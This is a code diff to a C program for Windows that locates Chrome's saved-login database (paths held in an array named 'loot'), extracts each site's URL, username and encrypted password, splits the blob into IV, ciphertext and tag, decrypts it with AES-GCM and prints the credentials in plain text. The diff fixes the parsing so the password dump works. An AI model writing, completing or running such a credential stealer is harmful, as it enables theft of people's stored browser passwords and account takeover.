@@ -82,39 +82,8 @@ PUCHAR AESGCMDecrypt(PUCHAR data, ULONG dataLen, PUCHAR iv, ULONG ivLen, PUCHAR 
     free(pbOutput);
     return NULL;
   }
+  pbOutput[pcbResult] = '\0';
   return pbOutput;
-}
-
-static int printCallback(void* NotUsed, int argc, char** argv, char** azColName){
-  for(int i = 0; i < argc; i++){
-    if(strcmp(azColName[i], "password_value") == 0){
-      //first three bytes are chrome version, omit
-      //next 12 bytes is the IV
-      DWORD totlen = strlen(argv[i]);
-      PUCHAR iv = malloc(sizeof(CHAR) * 12);
-      for(DWORD j = 2; j < 14; j++){
-        iv[j] = argv[i][j];
-      }
-      //everything in between is ciphertext
-      PUCHAR data = malloc(sizeof(CHAR) * (totlen - 12 - 16));
-      for(DWORD j = 14; j < totlen - 18; j++){
-        data[j] = argv[i][j];
-      }
-      //final 16 bytes is the MAC
-      PUCHAR tag = malloc(sizeof(CHAR) * 16);
-      for(DWORD j = totlen - 17; j < totlen; j++){
-        tag[j] = argv[i][j];
-      }
-      PUCHAR result = AESGCMDecrypt(data, strlen(data), iv, strlen(iv), tag);
-      printf("%s : %s\n", azColName[i], result);
-      free(iv);
-      free(data);
-      free(tag);
-    }else{
-      printf("%s : %s\n", azColName[i], argv[i]);
-    }
-  }
-  return 0;
 }
 
 int initDecrypt(BYTE* key, DWORD keySize){
@@ -351,6 +320,7 @@ int main(int argc, char *argv[]){
   SQLStatements sql;
   setupSQL(&sql);
   sqlite3 *db;
+  sqlite3_stmt *stmt;
   for(int i = 0; i < NUM_PATHS; i++){
     char* src = malloc(sizeof(char) * (strlen(dataPath) + strlen(loot[i]) + 1));
     if(!PathCombineA(
@@ -394,12 +364,35 @@ int main(int argc, char *argv[]){
         printf("[!] Error opening database: %s\n", sqlite3_errmsg(db));
         return -1;
       }
-      if(sqlite3_exec(db, sql.loginData, printCallback, NULL, NULL) != SQLITE_OK){
-        printf("[!] Error executing SQL: %s\n", sqlite3_errmsg(db));
+      if(sqlite3_prepare_v2(db, sql.loginData, -1, &stmt, 0) != SQLITE_OK){
+        printf("[!] Error preparing sql statement\n");
         return -1;
       }
+      //step through rows
+      while(sqlite3_step(stmt) == SQLITE_ROW){
+        const char* origin_url = sqlite3_column_text(stmt, 0);
+        const char* username_value = sqlite3_column_text(stmt, 1);
+        const char* password_value = sqlite3_column_blob(stmt, 2);
+        DWORD password_length = (DWORD)sqlite3_column_bytes(stmt, 2);
+        //decrypt password
+        BYTE* iv = malloc(sizeof(BYTE) * 12);
+        BYTE* data = malloc(sizeof(BYTE) * (password_length - 31));
+        BYTE* tag = malloc(sizeof(BYTE) * 16);
+        memcpy(iv, password_value + 3, 12);
+        memcpy(data, password_value + 15, password_length - 31);
+        memcpy(tag, password_value + (password_length - 16), 16);
+        printf("%s: \n", origin_url);
+        printf("username: %s\n", username_value);
+        printf("password: %s\n", AESGCMDecrypt(data, password_length - 31, iv, 12, tag));
+        free(iv);
+        free(data);
+        free(tag);
+      }
+      if(sqlite3_finalize(stmt) != SQLITE_OK){
+        printf("[!] Error finalizing statement\n");
+      }
       if(sqlite3_close(db) != SQLITE_OK){
-        printf("[!] Error closing DB: %s", sqlite3_errmsg(db));
+        printf("[!] Error closing DB: %s\n", sqlite3_errmsg(db));
         return -1;
       }
     }
